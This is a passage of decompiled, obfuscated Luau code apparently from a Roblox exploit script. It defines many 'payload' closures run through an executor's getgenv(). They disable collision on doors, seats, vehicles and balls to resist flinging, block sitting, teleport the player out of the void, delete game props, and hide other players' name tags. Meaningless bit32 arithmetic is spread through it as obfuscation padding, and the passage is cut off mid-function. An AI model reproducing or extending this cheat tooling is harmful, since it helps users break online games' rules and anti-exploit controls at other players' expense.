				descendant.CanCollide = false
			end
		end
	end
end

-- payload closure created 894-th (proto #788)
local function payload_fn_894()
	local character = upv1()
	character = character and character.Character
	if not character then
		return
	end
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	if not humanoidRootPart then
		return
	end

	if humanoidRootPart.Position.Y < -500 then
		humanoidRootPart.CFrame = CFrame.new(0, 100, 0)
	end

	upv2(character, true)
end

-- payload closure created 895-th (proto #574)
local function payload_fn_895()
	if upv1.HeartbeatConn then
		upv1.HeartbeatConn:Disconnect()
	end

	if upv1.CharConn then
		upv1.CharConn:Disconnect()
	end

	upv1.HeartbeatConn = upv2.Heartbeat:Connect(upv3)

	if upv4.LocalPlayer then
		local n2 = 407386973

		upv1.CharConn = upv4.LocalPlayer.CharacterAdded:Connect(function(character)
			task.wait(0.5)
			upv5(character, true)
		end)

		upv5(upv4.LocalPlayer.Character, true)
	else
		local n2 = 137482669

		upv1.CharConn = upv4.PlayerAdded:Connect(function(player)
			if player == upv4.LocalPlayer then
				player.CharacterAdded:Wait()
				task.wait(0.5)
				upv5(player.Character, true)
			end
		end)
	end
end

-- payload closure created 896-th (proto #576)
local function payload_fn_896()
	if upv1.HeartbeatConn then
		upv1.HeartbeatConn:Disconnect()
	end

	if upv1.CharConn then
		upv1.CharConn:Disconnect()
	end

	upv1.HeartbeatConn = nil
	upv1.CharConn = nil
end

-- payload closure created 897-th (proto #573)
local function payload_fn_897(enabled)
	upv1.Enabled = enabled

	if enabled then
		upv2()
	else
		upv3()
	end
end

-- payload closure created 899-th (proto #577)
local function payload_fn_899(arg)
	upv1 = arg
	upv2.FallenPartsDestroyHeight = arg and (0/0) or -500
end

-- payload closure created 900-th (proto #796)
local function payload_fn_900(arg)
	return arg and tonumber(string.match(tostring(arg), "%d+$"))
end

-- payload closure created 901-th (proto #795)
local function payload_fn_901()
	for _, v in ipairs(upv1) do
		v:Disconnect()
	end

	table.clear(upv1)
end

-- payload closure created 902-th (proto #794)
local function payload_fn_902(arg)
	local n2 = 4062248639
	local n3 = 2959618084
	local n4 = 4427470323
	local n5 = 3119730299
	local humanoid = arg:WaitForChild("Humanoid", 10)
	if not humanoid or not upv1 then
		return
	end
	local v = upv2
	local v2 = bit32.bxor(n4, 381760969)
	v()
	local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator", 5)
	local animate = arg:FindFirstChild("Animate")
	local v3

	if animate then
		local sit = animate:FindFirstChild("sit")
		v3 = sit
	else
		v3 = animate
	end

	if v3 then
		for _, child in ipairs(v3:GetChildren()) do
			local isAnimation = child:IsA("Animation") and upv3(child.AnimationId)

			if isAnimation then
				upv4[isAnimation] = true
			end
		end
	end

	local function fn(arg2)
		local animation = arg2.Animation
		animation = animation and upv3(animation.AnimationId)

		if animation and upv4[animation] then
			arg2:Stop(0)
		end
	end

	local function fn2()
		local seatPart = humanoid.SeatPart
		local str = "CoquetteAssentoLiberado"
		local coquetteAssentoLiberado = getgenv().CoquetteAssentoLiberado
		if seatPart and coquetteAssentoLiberado and coquetteAssentoLiberado.Parent and seatPart:IsDescendantOf(coquetteAssentoLiberado) then
			return
		end

		if seatPart then
			local animationSit = seatPart:FindFirstChild("Animation_Sit")
			animationSit = animationSit and upv3(animationSit.Value)

			if animationSit then
				upv4[animationSit] = true
			end
		end

		if seatPart then
			local seatWeld = seatPart:FindFirstChild("SeatWeld")

			if seatWeld then
				seatWeld:Destroy()
			else
				local connection = nil
				local n6 = 141174109

				connection = seatPart.ChildAdded:Connect(function(child)
					if child.Name ~= "SeatWeld" then
						return
					end
					connection:Disconnect()

					if humanoid.SeatPart == seatPart then
						child:Destroy()
						humanoid.Sit = false
					end
				end)

				task.delay(2, function()
					connection:Disconnect()
				end)
			end
		end

		if seatPart or humanoid.Sit then
			humanoid.Sit = false
		end

		if animator then
			for _, v4 in ipairs(animator:GetPlayingAnimationTracks()) do
				fn(v4)
			end
		end
	end

	humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)

	table.insert(upv5, humanoid:GetPropertyChangedSignal("SeatPart"):Connect(function()
		fn2()
		task.defer(fn2)
	end))

	table.insert(upv5, humanoid.StateChanged:Connect(function(old, new)
		if new == Enum.HumanoidStateType.Seated then
			fn2()
		end
	end))

	if animator then
		table.insert(upv5, animator.AnimationPlayed:Connect(fn))
	end

	fn2()
end

-- payload closure created 903-th (proto #792)
local function payload_fn_903(arg)
	return arg:IsA("Seat") or arg:IsA("VehicleSeat")
end

-- payload closure created 904-th (proto #793)
local function payload_fn_904(arg)
	if upv1[arg] ~= nil then
		return
	end
	upv1[arg] = arg.CanTouch
	arg.CanTouch = false
end

-- payload closure created 905-th (proto #t7974)
local function payload_fn_905()
	for k, v in pairs(upv1) do
		if k.Parent then
			k.CanTouch = v
		end
	end

	table.clear(upv1)
end

-- payload closure created 906-th (proto #578)
local function payload_fn_906(arg, arg2)
	local n2 = 2443236700
	upv1[arg] = arg2 and true or nil

	if next(upv1) then
		local n3 = 179280499
		if upv2 then
			return
		end
		upv3 += 1
		local v = upv3
		local v2 = workspace
		local v3 = bit32.bxor(n3, 269717680)
		local descendantAdded = v2.DescendantAdded
		local v4 = table.pack(bit32.band(v3, 4294967295))
		local v5 = table.pack(bit32.band(v4[1], 65535))
		local n4 = bit32.band(42660 * v5[1] + bit32.lshift(bit32.band(42660 * bit32.rshift(v4[1], 16) + 9077 * v5[1], 65535), 16), 4294967295) + 2484998220
		local v6 = table.pack(bit32.band(bit32.bor(v3, 124153179), 4294967295))
		local v7 = table.pack(bit32.band(v6[1], 65535))
		local v8 = bit32.band(22877 * v7[1] + bit32.lshift(bit32.band(22877 * bit32.rshift(v6[1], 16) + 56458 * v7[1], 65535), 16), 4294967295)
		local v9 = table.pack(bit32.band(bit32.band(v3, 124153179), 4294967295))
		local v10 = table.pack(bit32.band(v9[1], 65535))
		local n5 = n4 + v8 + bit32.band(22875 * v10[1] + bit32.lshift(bit32.band(22875 * bit32.rshift(v9[1], 16) + 56458 * v10[1], 65535), 16), 4294967295)

		upv2 = descendantAdded:Connect(function(arg3)
			if upv4(arg3) then
				upv5(arg3)
			end
		end)

		local localPlayer = game:GetService("Players").LocalPlayer
		upv7 = localPlayer.CharacterAdded:Connect(upv6)

		if localPlayer.Character then
			task.spawn(upv6, localPlayer.Character)
		end

		task.spawn(function()
			task.wait()
			local n6 = 0

			for _, child in ipairs(workspace:GetChildren()) do
				local descendants = child:GetDescendants()

				for i = 1, #descendants do
					if upv3 ~= v or not upv2 then
						return
					end
					local v11 = descendants[i]

					if upv4(v11) and v11.Parent then
						upv5(v11)
					end

					n6 += 1

					if n6 % 1500 == 0 then
						task.wait()
					end
				end
			end
		end)
	else
		upv3 += 1

		if upv2 then
			upv2:Disconnect()
			upv2 = nil
		end

		if upv7 then
			upv7:Disconnect()
			upv7 = nil
		end

		upv8()
		upv9()
	end
end

-- payload closure created 909-th (proto #581)
local function payload_fn_909(arg)
	if not arg:WaitForChild("Humanoid") then
		return
	end

	if upv1 then
		upv1:Disconnect()
		upv1 = nil
	end
end

-- payload closure created 910-th (proto #580)
local function payload_fn_910(arg)
	local n2 = 3059483724
	local n3 = 704543604
	upv1 = arg
	getgenv().CoquetteSoltarAssentos("antisit", arg)

	if arg then
		if upv2.Character then
			task.spawn(upv3, upv2.Character)
		end

		if upv4 then
			upv4:Disconnect()
		end

		upv4 = upv2.CharacterAdded:Connect(upv3)
	else
		if upv4 then
			upv4:Disconnect()
			upv4 = nil
		end

		if upv5 then
			upv5:Disconnect()
			upv5 = nil
		end

		local humanoid = upv2.Character and upv2.Character:FindFirstChildOfClass("Humanoid")

		if humanoid then
			humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
			bit32.bxor(bit32.band(n3, n2), 161643312)
		end
	end
end

-- payload closure created 911-th (proto #589)
local function payload_fn_911(arg, arg2)
	if not arg:IsA("BasePart") then
		return
	end

	if arg2 then
		if upv1[arg] ~= nil then
			arg.CanCollide = upv1[arg]
			upv1[arg] = nil
		end
	else
		if upv1[arg] == nil then
			upv1[arg] = arg.CanCollide
		end

		arg.CanCollide = false
	end
end

-- payload closure created 912-th (proto #593)
local function payload_fn_912()
	local flag = type(0) == "buffer"
	upv1 += 1
	local v = upv1
	local tbl = {}
	local n2 = 418471514

	for k in pairs(upv2) do
		tbl[#tbl + 1] = k
	end

	task.spawn(function()
		for i, v2 in ipairs(tbl) do
			if upv1 ~= v or upv3 then
				return
			end
			local v3 = upv2[v2]

			if v3 ~= nil then
				if v2.Parent then
					v2.CanCollide = v3
				end

				upv2[v2] = nil
			end

			if i % 400 == 0 then
				task.wait()
			end
		end
	end)
end

-- payload closure created 913-th (proto #t7938)
local function payload_fn_913(arg, arg2)
	if typeof(arg) ~= "string" then
		return false
	end
	local str = arg:lower()

	for _, v in ipairs(arg2) do
		if str:find(v) then
			return true
		end
	end

	return false
end

-- payload closure created 914-th (proto #t3531)
local function payload_fn_914(arg)
	local vehicles = upv1:FindFirstChild("Vehicles")
	if vehicles and arg:IsDescendantOf(vehicles) then
		return true
	end

	while arg do
		local str = arg.Name:lower()
		if str:find("daycare") or str:find("carpet") or str:find("card") or str:find("cart") or str:find("carrier") then
			return false
		end

		if str:find("car") then
			return true
		end
		arg = arg.Parent
	end

	return false
end

-- payload closure created 915-th (proto #t7866)
local function payload_fn_915(arg)
	while arg do
		local str = arg.Name:lower()
		if str:find("boathouse") or str:find("boatrental") then
			return false
		end

		if str:find("boat") then
			return true
		end
		arg = arg.Parent
	end

	return false
end

-- payload closure created 916-th (proto #799)
local function payload_fn_916(arg)
	if not upv1 then
		return
	end

	if not arg:IsA("BasePart") then
		return
	end
	local str = arg.Name:lower()
	if str:find("wheel") then
		return
	end
	local v = upv2(str, upv3)
	local v2 = upv4(arg)
	local v3 = upv5(arg)

	if v2 or v3 or v then
		upv6(arg, false)
	end
end

-- payload closure created 917-th (proto #586)
local function payload_fn_917(arg)
	local flag = type(61124556) == "string"
	upv1 += 1
	local v = upv1
	local n2 = 148185208

	task.spawn(function()
		task.wait()
		local n3 = 0

		for _, child in ipairs(upv2:GetChildren()) do
			local descendants = child:GetDescendants()
			table.insert(descendants, child)

			for i = 1, #descendants do
				if upv1 ~= v or not upv3 then
					return
				end
				local v2 = descendants[i]

				if v2.Parent then
					upv4(v2)

					if arg then
						arg(v2)
					end
				end

				n3 += 1

				if n3 % 1500 == 0 then
					task.wait()
				end
			end
		end
	end)
end

-- payload closure created 918-th (proto #583)
local function payload_fn_918()
	table.insert(upv1, upv2.DescendantAdded:Connect(upv3))
end

-- payload closure created 919-th (proto #585)
local function payload_fn_919()
	local humanoid = upv1.Character and upv1.Character:FindFirstChildOfClass("Humanoid")

	if humanoid then
		humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
	end
end

-- payload closure created 920-th (proto #582)
local function payload_fn_920(arg)
	arg:WaitForChild("Humanoid")

	if upv1 or upv2 then
		upv3()
	end
end

-- payload closure created 921-th (proto #588)
local function payload_fn_921(arg)
	local n001SoccerBalls = upv1:FindFirstChild("WorkspaceCom") and upv1.WorkspaceCom:FindFirstChild("001_SoccerBalls")
	if not n001SoccerBalls then
		return
	end

	for _, child in pairs(n001SoccerBalls:GetChildren()) do
		if child:IsA("BasePart") then
			upv2(child, not arg)
		end
	end
end

-- payload closure created 922-th (proto #802)
local function payload_fn_922(arg)
	if not arg:IsA("BasePart") then
		return
	end

	if not string.find(arg.Name, "Door") then
		return
	end
	local luscaaAttached = arg:FindFirstChild("Luscaa_Attached")

	if luscaaAttached then
		luscaaAttached:Destroy()
	end

	local luscaaBlackHoleAttachment = arg:FindFirstChild("Luscaa_BlackHoleAttachment")

	if luscaaBlackHoleAttachment then
		luscaaBlackHoleAttachment:Destroy()
	end

	upv1(arg, false)
end

-- payload closure created 923-th (proto #590)
local function payload_fn_923(arg)
	local blackHoleTarget = upv1:FindFirstChild("BlackHoleTarget")

	if blackHoleTarget then
		blackHoleTarget:Destroy()
	end

	local character = upv2.Character

	if character then
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

		if humanoidRootPart then
			local shnmaxTargetAttachment = humanoidRootPart:FindFirstChild("SHNMAX_TargetAttachment")

			if shnmaxTargetAttachment then
				shnmaxTargetAttachment:Destroy()
			end
		end
	end

	if arg then
		local flag = type("Character") == "userdata"
		local n2 = 254235513

		if upv3.antiFlingPortasConn then
			upv3.antiFlingPortasConn:Disconnect()
		end

		local n3 = n2 + 133348078

		upv3.antiFlingPortasConn = upv1.DescendantAdded:Connect(function(descendant)
			if descendant:IsA("BasePart") and string.find(descendant.Name, "Door") then
				upv4(descendant)
			end
		end)
	elseif upv3.antiFlingPortasConn then
		upv3.antiFlingPortasConn:Disconnect()
		upv3.antiFlingPortasConn = nil
	end
end

-- payload closure created 924-th (proto #591)
local function payload_fn_924(arg)
	local n2 = 8680657797

	local function fn()
		local workspaceCom = upv1:FindFirstChild("WorkspaceCom")
		local tbl = {}
		local helicopters = upv1:FindFirstChild("Helicopters")
		workspaceCom = workspaceCom and workspaceCom:FindFirstChild("001_CanoeStorage")
		tbl[1] = helicopters
		tbl[2] = workspaceCom
		return tbl
	end

	if upv2.antiFlingExtraConns then
		for _, antiFlingExtraConn in ipairs(upv2.antiFlingExtraConns) do
			antiFlingExtraConn:Disconnect()
		end

		upv2.antiFlingExtraConns = nil
	end

	if arg then
		upv2.antiFlingExtraConns = {}
		local v = pairs
		local v2 = fn(211882269, 84773708)

		for _, v3 in v(v2) do
			if v3 then
				local n3 = 558566743

				for _, descendant in ipairs(v3:GetDescendants()) do
					if descendant:IsA("BasePart") then
						upv3(descendant, false)
					end
				end

				local n4 = n3 - 122748259

				table.insert(upv2.antiFlingExtraConns, v3.DescendantAdded:Connect(function(descendant)
					if descendant:IsA("BasePart") then
						upv3(descendant, false)
					end
				end))
			end
		end
	end

	for _, v in ipairs({ "AntiFlingDoor", "AntiFlingSeat", "AntiFlingExtra" }) do
		for _, v2 in ipairs(upv4:GetTagged(v)) do
			upv4:RemoveTag(v2, v)
		end
	end
end

-- payload closure created 925-th (proto #584)
local function payload_fn_925(arg)
	local n2 = 1630732082
	local n3 = 2543463677
	upv1 = arg
	upv2 = arg
	upv3 = arg
	getgenv().CoquetteSoltarAssentos("antifling", arg)
	upv4()

	if arg then
		upv5(upv6)
	else
		upv7 += 1
	end

	upv8(arg)

	if upv9.antiFlingBallConn then
		upv9.antiFlingBallConn:Disconnect()
		upv9.antiFlingBallConn = nil
	end

	if arg then
		local n001SoccerBalls = upv10:FindFirstChild("WorkspaceCom") and upv10.WorkspaceCom:FindFirstChild("001_SoccerBalls")

		if n001SoccerBalls then
			local n4 = 4728996192

			upv9.antiFlingBallConn = n001SoccerBalls.ChildAdded:Connect(function(child)
				task.wait(0.3)

				if child:IsA("BasePart") and arg then
					upv11(child, false)
				end
			end)
		end
	end

	local v = upv12
	v(arg)
	upv13(arg)

	if not arg then
		upv14()
	end
end

-- payload closure created 932-th (proto #t3897)
local function payload_fn_932(arg)
	if not arg or not arg.Parent then
		return
	end
	local str = string.sub(arg.Name, 1, 11)

	if str == "BananaPeel_" then
		local touch = arg:FindFirstChild("Touch")

		if touch then
			touch.CanTouch = false
			local touchInterest = touch:FindFirstChild("TouchInterest")

			if touchInterest then
				touchInterest:Destroy()
			end
		else
			local n2 = 8710820151

			task.spawn(function()
				local touch2 = arg:WaitForChild("Touch", 3)

				if touch2 then
					touch2.CanTouch = false
					local touchInterest = touch2:FindFirstChild("TouchInterest")

					if touchInterest then
						touchInterest:Destroy()
					end
				end
			end)
		end
	end
end

-- payload closure created 933-th (proto #595)
local function payload_fn_933(arg)
	if arg then
		local n2 = 517597070
		local flag = type(0) == "boolean"

		for _, descendant in ipairs(workspace:GetDescendants()) do
			if string.sub(descendant.Name, 1, 11) == "BananaPeel_" then
				upv1(descendant)
			end
		end

		local v = workspace
		local v2 = bit32.bxor(n2, 331924837)
		local childAdded = v.ChildAdded
		local v3 = table.pack(bit32.band(v2, 4294967295))
		local v4 = table.pack(bit32.band(v3[1], 65535))
		local n3 = bit32.band(50146 * v4[1] + bit32.lshift(bit32.band(50146 * bit32.rshift(v3[1], 16) + 35237 * v4[1], 65535), 16), 4294967295) + 3456053734
		local v5 = table.pack(bit32.band(bit32.bor(v2, 181470499), 4294967295))
		local v6 = table.pack(bit32.band(v5[1], 65535))
		local v7 = bit32.band(15391 * v6[1] + bit32.lshift(bit32.band(15391 * bit32.rshift(v5[1], 16) + 30298 * v6[1], 65535), 16), 4294967295)
		local v8 = table.pack(bit32.band(bit32.band(v2, 181470499), 4294967295))
		local v9 = table.pack(bit32.band(v8[1], 65535))
		local n4 = n3 + v7 + bit32.band(15389 * v9[1] + bit32.lshift(bit32.band(15389 * bit32.rshift(v8[1], 16) + 30298 * v9[1], 65535), 16), 4294967295)

		upv2 = childAdded:Connect(function(arg2)
			local flag2 = type(5243899) == "boolean"
			local n5 = 451147596

			task.defer(function()
				upv1(arg2)
			end)
		end)
	elseif upv2 then
		upv2:Disconnect()
		upv2 = nil
	end
end

-- payload closure created 935-th (proto #596)
local function payload_fn_935(arg)
	local n001TrafficCones = workspace:FindFirstChild("WorkspaceCom") and workspace.WorkspaceCom:FindFirstChild("001_TrafficCones")
	if not n001TrafficCones then
		return
	end

	if arg then
		local flag = type("WorkspaceCom") == "vector"
		local n2 = 486225570

		for _, child in ipairs(n001TrafficCones:GetChildren()) do
			if string.sub(child.Name, 1, 4) == "Prop" then
				child:Destroy()
			end
		end

		local v = table.pack(bit32.band(n2, 4294967295))
		local v2 = table.pack(bit32.band(v[1], 65535))
		local n3 = bit32.band(27840 * v2[1] + bit32.lshift(bit32.band(27840 * bit32.rshift(v[1], 16) + 28363 * v2[1], 65535), 16), 4294967295) + 2014203328
		local v3 = table.pack(bit32.band(bit32.bor(n2, 299969645), 4294967295))
		local v4 = table.pack(bit32.band(v3[1], 65535))
		local v5 = bit32.band(9856 * v4[1] + bit32.lshift(bit32.band(9856 * bit32.rshift(v3[1], 16) + 8809 * v4[1], 65535), 16), 4294967295)
		local v6 = table.pack(bit32.band(bit32.bxor(n2, 299969645), 4294967295))
		local v7 = table.pack(bit32.band(v6[1], 65535))
		local n4 = n3 + v5 + bit32.band(27841 * v7[1] + bit32.lshift(bit32.band(27841 * bit32.rshift(v6[1], 16) + 28363 * v7[1], 65535), 16), 4294967295)

		upv1 = n001TrafficCones.ChildAdded:Connect(function(child)
			local flag2 = bit32.bxor(bit32.bxor(n4, 0), 446550049) ~= 394775278
			local n5 = 80348454

			task.defer(function()
				if not child or not child.Parent then
					return
				end

				if string.sub(child.Name, 1, 4) == "Prop" then
					child:Destroy()
				else
					local connection = nil
					local n6 = 148562990

					connection = child:GetPropertyChangedSignal("Name"):Connect(function()
						if string.sub(child.Name, 1, 4) == "Prop" then
							child:Destroy()
							connection:Disconnect()
						end
					end)

					task.delay(2, function()
						if connection and connection.Connected then
							connection:Disconnect()
						end
					end)
				end
			end)
		end)
	elseif upv1 then
		upv1:Disconnect()
		upv1 = nil
	end
end

-- payload closure created 937-th (proto #601)
local function payload_fn_937(arg)
	for _, v in ipairs(arg) do
		v:Disconnect()
	end

	table.clear(arg)
end

-- payload closure created 938-th (proto #812)
local function payload_fn_938(arg)
	local v = upv1[arg]
	if not v then
		return
	end
	upv1[arg] = nil
	local v2 = upv2[v.owner]
	if not v2 then
		return
	end
	local n2 = (v2[v.name] or 1) - 1
	v2[v.name] = n2 > 0 and n2 or nil
end

-- payload closure created 939-th (proto #t7528)
local function payload_fn_939(arg)
	if upv1[arg] then
		return
	end
	upv1[arg] = true
	upv2 += 1
	upv3[upv2] = arg
end

-- payload closure created 940-th (proto #608)
local function payload_fn_940(arg, arg2)
	if not upv1 or not arg:IsA("Tool") or upv2[arg] then
		return
	end
	local tbl = upv3[arg2]

	if not tbl then
		tbl = {}
		upv3[arg2] = tbl
	end

	local name = arg.Name
	local n2 = (tbl[name] or 0) + 1
	if n2 > upv4 then
		upv5(arg)
		return
	end
	upv2[arg] = { owner = arg2, name = name }
	tbl[name] = n2
end

-- payload closure created 941-th (proto #606)
local function payload_fn_941(arg, arg2)
	local n2 = 199349359
	local flag = type(0) == "thread"
	if not arg then
		return
	end
	local n3 = n2 + 480230408 - 15493608

	table.insert(upv1, arg.ChildAdded:Connect(function(child)
		upv2(child, arg2)
	end))

	table.insert(upv1, arg.ChildRemoved:Connect(upv3))

	task.spawn(function()
		for i, child in ipairs(arg:GetChildren()) do
			if not upv4 then
				return
			end
			upv2(child, arg2)

			if i % 50 == 0 then
				task.wait()
			end
		end
	end)
end

-- payload closure created 942-th (proto #t131)
local function payload_fn_942(arg)
	for _, descendant in ipairs(arg:GetDescendants()) do
		for _, v in ipairs(upv1:GetTags(descendant)) do
			upv1:RemoveTag(descendant, v)
		end
	end

	for _, v in ipairs(upv1:GetTags(arg)) do
		upv1:RemoveTag(arg, v)
	end
end

-- payload closure created 943-th (proto #810)
local function payload_fn_943()
	local n2 = 1816497041

	for i = 1, 10 do
		if not (upv2 < upv1) then
			local v = upv3[upv1]
			upv3[upv1] = nil
			upv1 += 1

			if v then
				upv4[v] = nil

				if v.Parent and v.Parent ~= upv5 then
					local n3 = 13192729266

					if pcall(function()
						v.Parent = upv5
					end) and v.Parent == upv5 then
						upv6 += 1
						upv7[upv6] = v
					end
				end
			end

			continue
		end

		break
	end

	if upv2 < upv1 then
		upv1 = 1
		upv2 = 0
	end

	for i = 1, 2 do
		if not (upv6 < upv8) then
			local v = upv7[upv8]
			upv7[upv8] = nil
			upv8 += 1

			if v and v.Parent == upv5 then
				upv9(v)
				v:Destroy()
			end

			continue
		end

		break
	end

	if upv6 < upv8 then
		upv8 = 1
		upv6 = 0
	end
end

-- payload closure created 944-th (proto #605)
local function payload_fn_944()
	if not upv1 then
		return
	end
	upv2(upv3)
	table.clear(upv4)
	table.clear(upv5)
	upv6(upv7:FindFirstChildOfClass("Backpack"), upv7)

	for _, player in ipairs(upv8:GetPlayers()) do
		upv6(player.Character, player)
	end
end

-- payload closure created 945-th (proto #604)
local function payload_fn_945(arg)
	local flag = type(480700959) == "function"
	local n2 = 543440891

	table.insert(upv1, arg.CharacterAdded:Connect(function()
		task.defer(upv2)
	end))
end

-- payload closure created 946-th (proto #603)
local function payload_fn_946()
	local n2 = 381556233
	local flag = type(381556233) == "table"
	local n3 = 3374159365
	local n4 = 1692973547
	upv1(upv2)
	upv1(upv3)

	for _, child in ipairs(upv4:GetChildren()) do
		upv5 += 1
		upv6[upv5] = child
	end

	local v = ipairs
	local v2 = bit32.bxor(n2, 342434027)

	for _, player in v(upv7:GetPlayers()) do
		upv8(player)
	end

	local insert = table.insert
	local playerAdded = upv7.PlayerAdded
	local v3 = table.pack(bit32.band(v2, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local n5 = bit32.band(23378 * v4[1] + bit32.lshift(bit32.band(23378 * bit32.rshift(v3[1], 16) + 39787 * v4[1], 65535), 16), 4294967295) + 92450722
	local v5 = table.pack(bit32.band(bit32.bor(v2, 202875369), 4294967295))
	local v6 = table.pack(bit32.band(v5[1], 65535))
	local v7 = bit32.band(42159 * v6[1] + bit32.lshift(bit32.band(42159 * bit32.rshift(v5[1], 16) + 25748 * v6[1], 65535), 16), 4294967295)
	local v8 = table.pack(bit32.band(bit32.band(v2, 202875369), 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local n6 = n5 + v7 + bit32.band(42157 * v9[1] + bit32.lshift(bit32.band(42157 * bit32.rshift(v8[1], 16) + 25748 * v9[1], 65535), 16), 4294967295)

	insert(upv2, playerAdded:Connect(function(arg)
		upv8(arg)
		task.defer(upv9)
	end))

	table.insert(upv2, upv7.PlayerRemoving:Connect(function()
		task.defer(upv9)
	end))

	table.insert(upv2, upv10.ChildAdded:Connect(function(child)
		if child:IsA("Backpack") then
			task.defer(upv9)
		end
	end))

	table.insert(upv2, upv11.Heartbeat:Connect(upv12))
	upv9()
end

-- payload closure created 947-th (proto #600)
local function payload_fn_947()
	upv1 = false
	upv2(upv3)
	upv2(upv4)
	table.clear(upv5)
	table.clear(upv6)
	table.clear(upv7)
	table.clear(upv8)
	table.clear(upv9)
	upv10 = 1
	upv11 = 0
	upv12 = 1
	upv13 = 0
end

-- payload closure created 948-th (proto #598)
local function payload_fn_948()
	return upv1
end

-- payload closure created 949-th (proto #597)
local function payload_fn_949()
	return #upv1:GetChildren()
end

-- payload closure created 950-th (proto #599)
local function payload_fn_950()
	return math.max(0, upv1 - upv2 + 1)
end

-- payload closure created 951-th (proto #602)
local function payload_fn_951(arg)
	upv1 = arg

	if arg then
		upv2()
	else
		upv3()
	end
end

-- payload closure created 958-th (proto #612)
local function payload_fn_958(arg)
	for _, v in ipairs(arg) do
		v:Disconnect()
	end

	table.clear(arg)
end

-- payload closure created 959-th (proto #617)
local function payload_fn_959(arg)
	local v = upv1[arg]

	if v then
		upv2(v.conns)
		upv1[arg] = nil
	end
end

-- payload closure created 960-th (proto #t7456)
local function payload_fn_960(arg)
	if arg and arg:IsA("BillboardGui") and arg.Enabled then
		arg.Enabled = false
	end
end

-- payload closure created 961-th (proto #t955)
local function payload_fn_961(arg, arg2)
	local n2 = 144773393
	local character = arg.Character
	character = character and character:FindFirstChild("Head")
	if not character then
		return
	end
	local v = upv1
	local conns = arg2.conns
	local v2 = bit32.bxor(n2, 529197633)
	v(conns)
	local nameGUI = character:FindFirstChild("NameGUI")
	upv2(nameGUI)

	if nameGUI then
		local n3 = 529357945

		table.insert(arg2.conns, nameGUI:GetPropertyChangedSignal("Enabled"):Connect(function()
			if upv3 then
				upv2(nameGUI)
			end
		end))
	end

	for _, child in ipairs(character:GetChildren()) do
		if child:IsA("ValueBase") and string.find(child.Name, "RP") then
			child:Destroy()
		end
	end

	local insert = table.insert
	local conns2 = arg2.conns
	local childAdded = character.ChildAdded
	local v3 = bit32.bxor(v2, 283743205)

	insert(conns2, childAdded:Connect(function(arg3)
		if not upv3 then
			return
		end

		if arg3.Name == "NameGUI" then
			task.defer(upv2, arg3)
		elseif arg3:IsA("ValueBase") and string.find(arg3.Name, "RP") then
			local flag = type(519219324) == "nil"
			local n3 = 4630082576

			task.defer(function()
				if arg3.Parent then
					arg3:Destroy()
				end
			end)
		end
	end))
end

-- payload closure created 962-th (proto #616)
local function payload_fn_962(arg, arg2)
	local n2 = 105807646
	upv1(arg)
	if arg == upv2 or not arg2 then
		return
	end
	local tbl = { conns = {}, eventos = 0, seguidos = 0 }
	local n3 = n2 + 309665095 + 50020876
	upv3[arg] = tbl
	local head = arg2:WaitForChild("Head", 10)
	if not head or not upv4 or upv3[arg] ~= tbl then
		return
	end

	if upv5[arg] then
		upv6(arg, tbl)
		return
	end

	local function fn()
		tbl.eventos = tbl.eventos + 1
	end

	table.insert(tbl.conns, head.ChildAdded:Connect(function(child)
		if child:IsA("ValueBase") then
			fn()
		end
	end))
end

-- payload closure created 963-th (proto #817)
local function payload_fn_963(arg)
	upv1 += arg
	if upv1 < 1 then
		return
	end
	upv1 = 0

	for k, v in pairs(upv2) do
		if not upv3[k] then
			if upv4 < v.eventos then
				v.seguidos = v.seguidos + 1

				if v.seguidos >= upv5 then
					upv3[k] = true
					upv6(k, v)
				end
			else
				v.seguidos = 0
			end

			v.eventos = 0
		end
	end
end

-- payload closure created 964-th (proto #615)
local function payload_fn_964(arg)
	local n2 = 53644492
	local flag = type(53644492) == "thread"
	if arg == upv1 then
		return
	end
	local n3 = n2 + 513631791 - 463118033

	local function fn(character)
		upv3(arg, character)
	end

	table.insert(upv2, arg.CharacterAdded:Connect(fn))

	if arg.Character then
		task.spawn(upv3, arg, arg.Character)
	end
end

-- payload closure created 965-th (proto #614)
local function payload_fn_965()
	local flag = type(261313658) == "nil"
	upv1(upv2)
	local n2 = 593006869

	for _, player in ipairs(upv3:GetPlayers()) do
		upv4(player)
	end

	table.insert(upv2, upv3.PlayerAdded:Connect(upv4))
	local n3 = n2 - 59873440

	table.insert(upv2, upv3.PlayerRemoving:Connect(function(player)
		upv5(player)
		upv6[player] = nil
	end))

	table.insert(upv2, upv7.Heartbeat:Connect(upv8))
end

-- payload closure created 966-th (proto #611)
local function payload_fn_966()
	upv1 = false
	upv2(upv3)

	for k in pairs(upv4) do
		upv5(k)
	end

	for k in pairs(upv6) do
		local character = k.Character
		character = character and character:FindFirstChild("Head")
		character = character and character:FindFirstChild("NameGUI")

		if character and character:IsA("BillboardGui") then
			character.Enabled = true
		end
	end

	table.clear(upv6)
end

-- payload closure created 967-th (proto #610)
local function payload_fn_967()
	return upv1
end

-- payload closure created 968-th (proto #609)
local function payload_fn_968()
	local tbl = {}

	for k in pairs(upv1) do
		table.insert(tbl, k.Name)
	end

	return tbl
end

-- payload closure created 969-th (proto #613)
local function payload_fn_969(arg)
	upv1 = arg

	if arg then
		upv2()
	else
		upv3()
	end
end

-- payload closure created 974-th (proto #621)
local function payload_fn_974(arg)
	for _, v in ipairs(arg) do
		v:Disconnect()
	end

	table.clear(arg)
end

-- payload closure created 975-th (proto #625)
local function payload_fn_975(arg)
	return arg:IsA("Backpack") or arg.Name == "StarterGear" and arg:IsA("StarterGear")
end

-- payload closure created 976-th (proto #t6996)
local function payload_fn_976(arg, arg2)
	local n2 = 424905364
	local v = upv1[arg]
	if not v or not arg2 or arg2.Parent ~= arg then
		return
	end
	local containers = v.containers
	local v2 = table.pack(bit32.band(n2, 4294967295))
	local v3 = table.pack(bit32.band(v2[1], 65535))
	local n3 = bit32.band(9168 * v3[1] + bit32.lshift(bit32.band(9168 * bit32.rshift(v2[1], 16) + 31191 * v3[1], 65535), 16), 4294967295) + 3941241712
